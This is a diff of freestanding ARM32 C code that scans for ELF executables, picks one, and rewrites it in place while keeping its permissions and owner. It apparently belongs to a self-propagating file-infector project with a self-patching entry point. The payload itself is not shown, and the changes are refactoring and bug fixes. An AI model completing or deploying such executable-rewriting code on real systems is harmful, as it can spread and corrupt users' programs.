@@ -109,16 +109,6 @@ static long syscall6(long n, long a, long b, long c, long d, long e, long f)
     return ret;
 }
 
-// Division is based on the code in the following repository:
-//   https://github.com/ARM-software/arm-trusted-firmware/tree/master/lib/aarch32
-struct qr
-{
-    unsigned int q;
-    unsigned int r;
-    unsigned int q_n;
-    unsigned int r_n;
-};
-
 __attribute__((naked))
 static unsigned int ret_uidivmod(unsigned int q, unsigned int r)
 {
@@ -129,57 +119,53 @@ static unsigned int ret_uidivmod(unsigned int q, unsigned int r)
         );
 }
 
-static void div_qr(unsigned int n, unsigned int p, struct qr *qr)
+static void uidivmod(unsigned int n, unsigned int d, unsigned int *q, unsigned int *r)
 {
-    unsigned int i = 1;
-    unsigned int q = 0;
-
-    if (p == 0)
+    *q = 0;
+    *r = 0;
+    if (d == 0)
     {
-        qr->r = 0xFFFFFFFF;
         return;
     }
 
-    while ((p >> 31) == 0)
+    for (int i = 31; i >= 0; i--)
     {
-        i = i << 1;
-        p = p << 1;
-    }
-    while (i > 0)
-    {
-        q = q << 1;
-        if (n >= p)
+        if (d <= (n >> i))
         {
-            n -= p;
-            q++;
+            n -= (d << i);
+            (*q) |= 0x1U << i;
         }
-        p = p >> 1;
-        i = i >> 1;
     }
-    qr->r = n;
-    qr->q = q;
-}
-
-static void uint_div_qr(unsigned int n, unsigned int d, struct qr *qr)
-{
-    div_qr(n, d, qr);
-    if (qr->q_n)
-    {
-        qr->q = -qr->q;
-    }
-    if (qr->r_n)
-    {
-        qr->r = -qr->r;
-    }
+    *r = n;
 }
 
 __attribute__((used))
 static unsigned int __aeabi_uidivmod(unsigned int n, unsigned int d)
 {
-    struct qr qr = { .q_n = 0, .r_n = 0 };
+    unsigned int q;
+    unsigned int r;
+    uidivmod(n, d, &q, &r);
+    return ret_uidivmod(q, r);
+}
 
-    uint_div_qr(n, d, &qr);
-    return ret_uidivmod(qr.q, qr.r);
+__attribute__((used))
+static int __aeabi_idiv(int n, int d)
+{
+    int s = (n >> 31) ^ (d >> 31) ? -1 : 1;
+    unsigned int _n = (unsigned int) n;
+    unsigned int _d = (unsigned int) d;
+    if (n < 0)
+    {
+        _n = -_n;
+    }
+    if (d < 0)
+    {
+        _d = -_d;
+    }
+    unsigned int q;
+    unsigned int r;
+    uidivmod(_n, _d, &q, &r);
+    return s * (int) q;
 }
 
 static void *memset(void *s, int c, usize n)
@@ -269,11 +255,11 @@ static void free_arena(struct arena *a)
 static void *alloc(struct arena *a, size sz, size align, size count)
 {
     size pad = -(iptr) a->beg & (align - 1);
-//    size avail = a->end - a->beg - pad;
-//    if (avail < 0 || count > avail / sz)
-//    {
-//        longjmp(*a->ctx, 1);
-//    }
+    size avail = a->end - a->beg - pad;
+    if (avail < 0 || count > avail / sz)
+    {
+        longjmp(*a->ctx, 1);
+    }
     u8 *p = a->beg + pad;
     a->beg += pad + count * sz;
     if (a->beg >= *a->commit)
@@ -329,6 +315,37 @@ static struct s8 s8cat(struct arena *a, struct s8 head, struct s8 tail)
     return head;
 }
 
+static int s8open(struct arena a, struct s8 path, int flags)
+{
+    struct s8 tpath = s8cat(&a, path, s8nul);
+    return (int) SYSCALL2(SYS_open, tpath.data, flags);
+}
+
+static int s8unlink(struct arena a, struct s8 path)
+{
+    struct s8 tpath = s8cat(&a, path, s8nul);
+    return SYSCALL1(SYS_unlink, tpath.data);
+}
+
+static int s8rename(struct arena a, struct s8 oldpath, struct s8 newpath)
+{
+    struct s8 toldpath = s8cat(&a, oldpath, s8nul);
+    struct s8 tnewpath = s8cat(&a, newpath, s8nul);
+    return SYSCALL2(SYS_rename, toldpath.data, tnewpath.data);
+}
+
+static int s8chmod(struct arena a, struct s8 path, mode_t mode)
+{
+    struct s8 tpath = s8cat(&a, path, s8nul);
+    return SYSCALL2(SYS_chmod, tpath.data, mode);
+}
+
+static int s8chown(struct arena a, struct s8 path, uid_t own, gid_t grp)
+{
+    struct s8 tpath = s8cat(&a, path, s8nul);
+    return SYSCALL3(SYS_chown, tpath.data, own, grp);
+}
+
 struct linux_dirent64
 {
     u64	d_ino;
@@ -344,8 +361,7 @@ static bool is_exec(struct arena scratch, struct s8 fname)
     Elf32_Ehdr ehdr;
     bool exec = false;
 
-    fname = s8cat(&scratch, fname, s8nul);
-    if ((fd = (int) SYSCALL2(SYS_open, fname.data, O_RDONLY)) < 0
+    if ((fd = s8open(scratch, fname, O_RDONLY)) < 0
         || SYSCALL3(SYS_read, fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr))
     {
         goto cleanup;
@@ -455,8 +471,7 @@ static void write_file(struct arena scratch, struct s8 fname)
     struct s8 tname = s8cat(&scratch, fname, s8(".tmp"));
     int fd = -1;
     struct stat64 sbuf;
-    fname = s8cat(&scratch, fname, s8nul);
-    if ((fd = (int) SYSCALL2(SYS_open, fname.data, O_RDONLY)) < 0
+    if ((fd = s8open(scratch, fname, O_RDONLY)) < 0
         || SYSCALL2(SYS_fstat64, fd, &sbuf) < 0)
     {
         goto cleanup;
@@ -470,8 +485,7 @@ static void write_file(struct arena scratch, struct s8 fname)
     }
 
     int tfd = -1;
-    tname = s8cat(&scratch, tname, s8nul);
-    if ((tfd = (int) SYSCALL2(SYS_open, tname.data, O_WRONLY | O_CREAT)) < 0)
+    if ((tfd = s8open(scratch, tname, O_WRONLY | O_CREAT)) < 0)
     {
         goto cleanup;
     }
@@ -481,9 +495,9 @@ static void write_file(struct arena scratch, struct s8 fname)
         goto cleanup;
     }
 
-    if (SYSCALL2(SYS_rename, tname.data, fname.data) < 0
-        || SYSCALL2(SYS_chmod, fname.data, sbuf.st_mode) < 0
-        || SYSCALL3(SYS_chown, fname.data, sbuf.st_uid, sbuf.st_gid) < 0)
+    if (s8rename(scratch, tname, fname) < 0
+        || s8chmod(scratch, fname, sbuf.st_mode) < 0
+        || s8chown(scratch, fname, sbuf.st_uid, sbuf.st_gid) < 0)
     {
         goto cleanup;
     }
@@ -495,14 +509,16 @@ cleanup:
     }
     SYSCALL1(SYS_close, tfd);
     SYSCALL1(SYS_close, fd);
-    SYSCALL1(SYS_unlink, tname.data);
+    s8unlink(scratch, tname);
 }
 
 // _start offset: XXX
-void start(int argc, char **argv)
+void start(int argc, char **argv, char **env, Elf32_auxv_t *aux)
 {
     (void) argc;
     (void) argv;
+    (void) env;
+    (void) aux;
     jmp_buf ctx;
     struct arena perm = { 0 };
     struct arena scratch = { 0 };
@@ -518,17 +534,18 @@ void start(int argc, char **argv)
         goto cleanup;
     }
 
-    struct s8 fname;
-    if (!pick_exec(&perm, scratch, &fname))
+    struct s8 tname;
+    if (!pick_exec(&perm, scratch, &tname))
     {
         goto cleanup;
     }
-    if (SYSCALL3(SYS_write, 1, fname.data, fname.len) < fname.len
+
+    if (SYSCALL3(SYS_write, 1, tname.data, tname.len) < tname.len
         || SYSCALL3(SYS_write, 1, "\n", 1) < 1)
     {
         goto cleanup;
     }
-    write_file(scratch, fname);
+    write_file(scratch, tname);
 
 cleanup:
     free_arena(&scratch);
@@ -542,6 +559,15 @@ void _start(void)
     __asm(
         "ldr     r0, [sp]\n"
         "add     r1, sp, #4\n"
+        "add     r2, r1, r0, lsl #2\n"
+        "mov     r3, r2\n"
+        "add     r2, r2, #4\n"
+        "not_zero:\n"
+        "add     r3, r3, #4\n"
+        "ldr     r4, [r3]\n"
+        "cmp     r4, #0\n"
+        "bne     not_zero\n"
+        "add     r3, r3, #4\n"
         "bl      start\n"
         "mov     r7, #1\n"
         "mov     r0, #0\n"
@@ -549,3 +575,9 @@ void _start(void)
         );
 }
 #endif
+
+// r3 = r2 - 4
+// not_zero:
+// r3 += 4
+// load r4 [r3]
+// if not zero branch not_zero
